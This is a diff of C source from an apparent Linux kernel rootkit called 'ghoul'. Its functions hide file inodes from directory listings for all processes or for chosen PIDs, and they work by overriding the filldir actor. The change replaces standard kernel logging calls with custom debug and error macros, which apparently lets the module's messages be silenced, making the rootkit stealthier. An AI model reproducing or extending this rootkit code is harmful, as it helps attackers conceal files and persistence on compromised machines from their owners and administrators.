@@ -2,6 +2,7 @@
 #include <linux/slab.h>
 #include <linux/sched.h>
 #include <linux/uaccess.h>
+#include "ghoul.h"
 #include "hide.h"
 #include "service.h"
 #include "privileges.h"
@@ -28,7 +29,7 @@ notrace void hide_file_inode(unsigned long ino)
     struct inode_list *inode_entry;
     struct pid_list *pid_entry, *temp;
 
-    pr_info("ghoul: hiding inode %lu\n", ino);
+    debug("ghoul: hiding inode %lu\n", ino);
 
     // make sure inode is not already hidden
     list_for_each_entry(inode_entry, &hidden_inodes, list) {
@@ -53,7 +54,7 @@ notrace void hide_file_inode(unsigned long ino)
     inode_entry = kzalloc(sizeof(struct inode_list), GFP_KERNEL);
 
     if (inode_entry == NULL) {
-        pr_err("ghoul: memory allocation error while hiding inode\n");
+        error("ghoul: memory allocation error while hiding inode\n");
         return;
     }
 
@@ -108,7 +109,7 @@ notrace void do_show_file_inode(unsigned long ino, int pid)
     
     // show inode to all PIDs - delete from hidden inodes list
     if (pid == ALL_PIDS) {
-        pr_info("ghoul: showing inode %lu for all processes\n", ino);
+        debug("ghoul: showing inode %lu for all processes\n", ino);
 
         // free all excluded PIDs first
         if (!list_empty(&hidden_inode->excluded_pids)) {
@@ -129,11 +130,11 @@ notrace void do_show_file_inode(unsigned long ino, int pid)
         pid = current->parent->pid;
 
     // show inode to a specific PID - add PID to excluded PIDs list
-    pr_info("ghoul: showing inode %lu for PID %d\n", ino, pid);
+    debug("ghoul: showing inode %lu for PID %d\n", ino, pid);
     excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
 
     if (excluded_pid == NULL) {
-        pr_err("ghoul: memory allocation error while showing inode\n");
+        error("ghoul: memory allocation error while showing inode\n");
         return;
     }
 
@@ -147,7 +148,7 @@ notrace void show_file_inode(const void __user *user_info)
 
     // copy request info
     if (copy_from_user((void *)&info, user_info, sizeof(struct show_file_inode_info))) {
-        pr_info("ghoul: can't copy user data\n");
+        debug("ghoul: can't copy user data\n");
         return;
     }
 
@@ -166,7 +167,7 @@ notrace int filldir_actor(struct dir_context *ctx, const char *name, int namlen,
     
     // oh no, original actor was not saved
     else {
-        pr_err("ghoul: ERROR - original filldir actor was not saved\n");
+        error("ghoul: ERROR - original filldir actor was not saved\n");
         return -EFAULT;
     }
 }
